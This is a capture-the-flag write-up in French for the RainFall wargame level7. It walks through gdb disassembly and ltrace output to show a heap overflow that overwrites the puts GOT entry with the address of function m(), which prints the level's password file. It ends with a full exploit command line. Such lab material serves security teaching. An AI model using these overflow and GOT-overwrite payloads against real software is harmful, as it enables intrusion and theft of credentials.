0x080485c2 <+161>:	mov    $0x80486e9,%edx
0x080485c7 <+166>:	mov    $0x80486eb,%eax
0x080485cc <+171>:	mov    %edx,0x4(%esp)
0x080485d0 <+175>:	mov    %eax,(%esp)
0x080485d3 <+178>:	call   0x8048430 <fopen@plt>

>b *0x080485d3
>(gdb) x/s 0x80486e9
0x80486e9:	 "r"
>(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"

Il lit le .pass et le store dans une variable print dans une fonction inutilisee, la fonction m()

0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
0x080485d8 <+183>:	mov    %eax,0x8(%esp)
0x080485dc <+187>:	movl   $0x44,0x4(%esp)
0x080485e4 <+195>:	movl   $0x8049960,(%esp)
0x080485eb <+202>:	call   0x80483c0 <fgets@plt>

l'adresse 0x8049960 contient le .pass'

(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)   <<<< ajoute ici en argument a printf
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret

La string envoyee a printf:
(gdb) x/s 0x80486e0
0x80486e0:	 "%s - %d\n"
effectivement prend une autre string en argument (le .pass) et la fonction time() aussi, inutile pour le coup.

level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBB
__libc_start_main(0x8048521, 3, 0xbffff6b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                        = 0x0804a008
malloc(8)                                                                        = 0x0804a018
malloc(8)                                                                        = 0x0804a028
malloc(8)                                                                        = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                        = 0x0804a018
strcpy(0x41414141, "BBBBBB" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

on peut ecrire dans l'adresse qu'on veut (2e strcpy) grace a l'overflow du premier strcpy
on va ecrire dans puts pour qu'il appelle m() -> 0x080484f4
offset a 20

0x08048400  puts
0x08048400  puts@plt
>(gdb) disas 0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:		jmp    *0x8049928
   0x08048406 <+6>:		push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.

argv[2] est copy dans l adresse pointee par l overflow
on ecrit l adresse de m() a la place de puts()

./level7 $(python -c "print 'A'*20 + '\x08\x04\x99\x28'[::-1]") $(python -c "print '\x08\x04\x84\xf4'[::-1]")